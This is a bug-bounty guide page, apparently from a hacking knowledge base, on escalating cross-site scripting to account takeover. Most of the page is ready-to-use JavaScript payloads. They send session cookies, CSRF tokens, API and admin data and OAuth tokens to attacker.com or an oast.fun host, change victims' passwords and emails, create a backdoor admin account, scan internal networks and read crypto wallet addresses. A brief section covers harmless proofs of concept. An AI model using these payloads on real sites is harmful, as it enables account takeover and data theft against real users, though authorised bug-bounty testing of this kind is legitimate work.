---
tags:
  - high
  - client-side
---

# XSS Escalation

You have XSS execution. Now maximize the impact for your report.

## Impact Hierarchy

From lowest to highest severity:

1. **Self-XSS** — Only affects the attacker → Usually not accepted
2. **Reflected, no sensitive context** → Low
3. **Reflected, in authenticated area** → Medium
4. **Stored, affects other users** → High
5. **Stored, affects privileged users** → High-Critical
6. **Full account takeover** → Critical

Your goal: climb this ladder.

---

## Escalation Paths

### Self-XSS → Real Impact

Self-XSS alone is usually rejected. Chain it:

- **+ CSRF** — If CSRF on an action that triggers XSS
- **+ Login CSRF** — Force victim to login to attacker account, execute XSS
- **+ Clickjacking** — Frame the page, trick user interaction
- **+ Open Redirect** — Redirect to XSS payload

### Reflected → Stored

Find where reflected input might be stored:

- Profile updates
- Comment previews that save
- Draft features
- Log pages (admin viewing logs)
- Error logs

### Cookie Stealing → ATO

```javascript
// Steal session cookie
fetch("https://attacker.com/steal?c="+document.cookie);
```

**Blocked by HttpOnly?** Extract tokens differently:

```javascript
// Extract from DOM
fetch("https://attacker.com/steal?token="+document.querySelector('[name=csrf_token]').value);

// Extract from API response
fetch("/api/me").then(r=>r.json()).then(d=>fetch("https://attacker.com/steal?data="+JSON.stringify(d)));
```

### Session Hijacking → Password Change

Why steal session when you can change password?

```javascript
// Change password (if no current password required)
fetch("/api/user/password",{
  method:"POST",
  headers:{"Content-Type":"application/json"},
  credentials:"include",
  body:JSON.stringify({new_password:"hacked123"})
});

// Or change email, then reset password
fetch("/api/user/email",{
  method:"POST", 
  headers:{"Content-Type":"application/json"},
  credentials:"include",
  body:JSON.stringify({email:"attacker@evil.com"})
});
```

### User XSS → Admin XSS

If stored XSS affects admin:

```javascript
// Create new admin user
fetch("/admin/users",{
  method:"POST",
  headers:{"Content-Type":"application/json"},
  credentials:"include",
  body:JSON.stringify({
    username:"backdoor",
    password:"hacked123",
    role:"admin"
  })
});

// Or extract admin secrets
fetch("/admin/settings").then(r=>r.text()).then(d=>
  fetch("https://attacker.com/exfil",{method:"POST",body:d})
);
```

### XSS → Internal Network Access

If XSS runs in context with internal access:

```javascript
// Port scan internal network
for(let i=1;i<255;i++){
  let img=new Image();
  img.onload=()=>fetch("https://attacker.com/found?ip=192.168.1."+i);
  img.src="http://192.168.1."+i+":80/favicon.ico";
}

// Access internal service
fetch("http://internal-service.local/api/secrets")
  .then(r=>r.text())
  .then(d=>fetch("https://attacker.com/exfil",{method:"POST",body:d}));
```

### XSS → OAuth Token Theft

If site uses OAuth:

```javascript
// Intercept OAuth tokens
if(location.hash.includes('access_token')){
  fetch("https://attacker.com/steal?token="+location.hash);
}
```

### XSS → Crypto/Wallet Draining

For Web3/crypto apps:

```javascript
// Detect wallet
if(typeof ethereum !== 'undefined'){
  ethereum.request({method:'eth_accounts'}).then(accounts=>{
    fetch("https://attacker.com/wallet?addr="+accounts[0]);
  });
}
```

---

## PostMessage XSS Chains

### Stored DOM XSS

```javascript
// Store payload in localStorage
localStorage.setItem('prefs', '<img src=x onerror=alert(1)>');

// Later execution when page loads:
document.body.innerHTML = localStorage.getItem('prefs');
```

### PostMessage to Parent

```javascript
// XSS on widgets.example.com
// Send malicious postMessage to parent
parent.postMessage({
  type: 'inject',
  html: '<img src=x onerror=alert(document.domain)>'
}, '*');
```

### Cookie Tossing (Self-XSS Upgrade)

```javascript
// Set cookie on subdomain affecting main domain
document.cookie = 'xss=<script>alert(1)</script>;domain=.example.com;path=/';
```

---

## Real Example: PostMessage Chain

**Jetpack PostMessage XSS (Report #2371019):**

```javascript
// Stage 1: XSS on widgets.wp.com
https://widgets.wp.com/sharing-buttons-preview/?custom[0][name]="><img src onerror=alert()>

// Stage 2: PostMessage to parent
const payload = {
  type: 'showOtherGravatars',
  likers: [{avatar_URL: 'javascript:alert(document.domain)'}]
};
parent.postMessage(payload, '*');
```

---

## Demonstrating Impact

### For Bug Bounty Reports

Don't just say "XSS can steal cookies." Show it:

1. **Minimal PoC** — `alert(document.domain)` screenshot
2. **Impact Demo** — Actually steal a session or perform ATO
3. **Attack Scenario** — Step-by-step for a real victim

### Impact Wording

| Action | Impact Statement |
|--------|------------------|
| Session theft | "Attacker can hijack any user session" |
| ATO via email change | "Attacker can take over any user account permanently" |
| Admin compromise | "Attacker can escalate to admin, affecting all users" |
| Data exfil | "Attacker can extract sensitive data (PII, financial)" |

---

## PoC Best Practices

### Clean, Safe PoC

```javascript
// Instead of stealing real data:
alert("XSS - Domain: "+document.domain+"\nCookies would be: "+document.cookie.length+" chars");

// Or benign visible action:
document.body.innerHTML='<h1>XSS PoC by YourHandle</h1><p>This page was modified via XSS.</p>';
```

### Interactsh for Blind XSS

```javascript
"><script>fetch("https://YOUR-ID.oast.fun/?c="+document.cookie)</script>
```

Shows:
- XSS fired (HTTP request logged)
- What data could be exfiltrated

---

## Checklist Before Reporting

- [ ] Can I steal session/cookies?
- [ ] Can I perform actions as victim (CSRF via XSS)?
- [ ] Can I access sensitive data?
- [ ] Does it affect privileged users (admins)?
- [ ] Can I chain with other bugs?
- [ ] Is my PoC clear and reproducible?
- [ ] Is my impact statement accurate and specific?

---

Ready to report? Check [Report Templates](../../reports/templates.md).
